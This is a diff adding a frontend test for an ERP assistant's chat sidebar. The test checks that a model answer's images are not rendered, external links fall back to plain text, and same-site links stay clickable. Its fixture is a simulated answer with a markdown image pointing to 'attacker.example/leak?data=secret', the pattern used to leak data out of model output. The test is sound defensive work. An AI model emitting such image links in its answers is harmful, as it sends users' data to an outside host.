@@ -403,3 +403,16 @@ it('本轮实际发生的 ERP 读取跟着它那条消息显示，提案落在�
  expect(within(turn).getByRole('button',{name:'确认执行'})).toBeTruthy();
  expect(screen.queryByRole('region',{name:'未归属到具体消息的条目'})).toBeNull();
 });
+
+it('模型回答里的图片不渲染、外链退化为纯文本，同站链接仍可点',async()=>{
+ const answer='![盘点单](https://attacker.example/leak?data=secret)\n\n[外部报表](https://attacker.example/report) 与 [本站单据](/app/item/DAILY-AGENT-ITEM)';
+ const api=async method=>method==='list_sessions'?[{id:session.id,title:session.title}]:{...session,messages:[{...session.messages[0],answer}]};
+ render(<ContextSidebar api={api} capture={()=>snapshot}/>);open();
+ await screen.findByText('[图片：盘点单]');
+ expect(document.querySelectorAll('.dsh-agent-answer img').length).toBe(0);
+ const links=[...document.querySelectorAll('.dsh-agent-answer a')];
+ expect(links.length).toBe(1);
+ expect(links[0].getAttribute('href')).toBe('/app/item/DAILY-AGENT-ITEM');
+ expect(document.querySelector('.dsh-agent-answer').textContent).toContain('attacker.example/report');
+ expect([...document.querySelectorAll('.dsh-agent-answer a')].some(a=>a.getAttribute('href')?.includes('attacker'))).toBe(false);
+});
